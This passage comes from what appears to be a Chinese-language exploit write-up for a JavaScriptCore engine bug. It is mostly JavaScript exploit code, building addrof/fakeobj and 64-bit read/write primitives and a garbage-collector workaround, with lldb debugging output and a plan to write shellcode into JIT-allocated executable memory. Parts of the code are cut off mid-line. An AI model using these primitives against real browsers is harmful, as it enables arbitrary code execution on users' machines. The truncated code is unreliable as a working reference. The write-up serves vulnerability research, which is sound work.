    write64 : function (addr, content){
            hax[1] = i2f(addr+0x10);
            controller.a = this.fakeobj(content);
    }
试试效果：
    var stage2 = {
        addrof : function (obj){
            boxed[0] = obj;
            return f2i(unboxed[0]);
        },
        fakeobj : function (addr){
            unboxed[0] = i2f(addr);
            return boxed[0];
        },
        read64 : function (addr){
            hax[1] = i2f(addr+0x10);
            return this.addrof(controller.a);
        },
        write64 : function (addr, content){
            hax[1] = i2f(addr+0x10);
            controller.a = this.fakeobj(content);
        },
        test : function(){
            testObj = {};
            testObj[0] = 1.1;
            obj_addr = this.addrof(testObj)
            value = 0x1122334455667788;
            this.write64(obj_addr+8, value);
        },
    };
    stage2.test();
    >>> describe(testObj)
    Object: 0x1082b0100 with butterfly 0x1122334455667800 (Structure 0x10820d3b0:[Object, {}, NonArrayWithDouble, Proto:0x1082b4000, Leaf]), StructureID: 1333
    >>>
发现写进去的数据不完整，这是因为JavaScript不能表示那么大的整型，所以我选择一次写四个字节。但是测试的时候还是出了错：
        test : function(){
            testObj = {};
            testObj[0] = 1.1;
            obj_addr = this.addrof(testObj);
            value = 0x11223344;
            this.write64(obj_addr+8, value);
        },
    (lldb) run -i ../bug_191731/test/poc.js
    Process 42272 stopped
    * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x11223ed8)
        frame #0: 0x000000010000c145 jsc`JSC::MarkedBlock::vm(this=0x0000000011220000) const at MarkedBlock.h:472:21
       469
       470     inline VM* MarkedBlock::vm() const
       471     {
    -> 472         return footer().m_vm;
       473     }
       474
       475     inline WeakSet& MarkedBlock::Handle::weakSet()
    Target 0: (jsc) stopped.
    (lldb)
我猜测是因为gc的检查导致的问题，所以我写了个简单的`passGC()`：
    passGC : function (){
            var passObj = {};
            passObj[0] = 1.1;
            this.write64(this.addrof(passObj+8), 0x7);
    },
再次运行：
    test : function(){
            testObj = {};
            testObj[0] = 1.1;
            obj_addr = this.addrof(testObj);
            this.passGC();
            value = 0x11223344;
            this.write64(obj_addr+8, value);
    },
    (lldb) run -i ../bug_191731/test/poc.js
    >>> describe(testObj)
    Object: 0x108ab0100 with butterfly 0x11223344 (Structure 0x108a0d420:[Object, {}, NonArrayWithDouble, Proto:0x108ab4000, Leaf]), StructureID: 1334
    >>>
看起来效果还不错，解决了写的问题，之后就需要考虑下写哪里的问题了，因为JIT会在内存中申请RWX的内存，所以可以构造一个JIT编译的function出来，然后找到代码的位置，将shellcode写进去，最后执行function就可以了。构造JIT
Function：
    getJITFunction : function (){
            function target(num) {
                for (var i = 2; i >> hex(shellcodeObj[1])
    0x33696e808d19
    (lldb) x/10i 0x33696e808d19
        0x33696e808d19: 49 bb 71 e7 ff 08 01 00 00 00  movabsq $0x108ffe771, %r11        ; imm = 0x108FFE771
        0x33696e808d23: 41 c6 03 00                    movb   $0x0, (%r11)
        0x33696e808d27: 55                             pushq  %rbp
        0x33696e808d28: 48 89 e5                       movq   %rsp, %rbp
        0x33696e808d2b: 49 bb 60 e7 ff 08 01 00 00 00  movabsq $0x108ffe760, %r11        ; imm = 0x108FFE760
        0x33696e808d35: 4c 89 5d 10                    movq   %r11, 0x10(%rbp)
        0x33696e808d39: 8b 75 20                       movl   0x20(%rbp), %esi
        0x33696e808d3c: 83 fe 02                       cmpl   $0x2, %esi
        0x33696e808d3f: 0f 83 8d f8 ff ff              jae    0x33696e8085d2
        0x33696e808d45: 48 89 ef                       movq   %rbp, %rdi
    (lldb)
看汇编差不多就知道是构造出来的target函数了。构造一个写shellcode的函数：
    injectShellcode : function (addr, shellcode){
            var theAddr = addr;
            this.passGC();
            for(var i=0, len=shellcode.length; i 
[2] 
[3] 
[4] 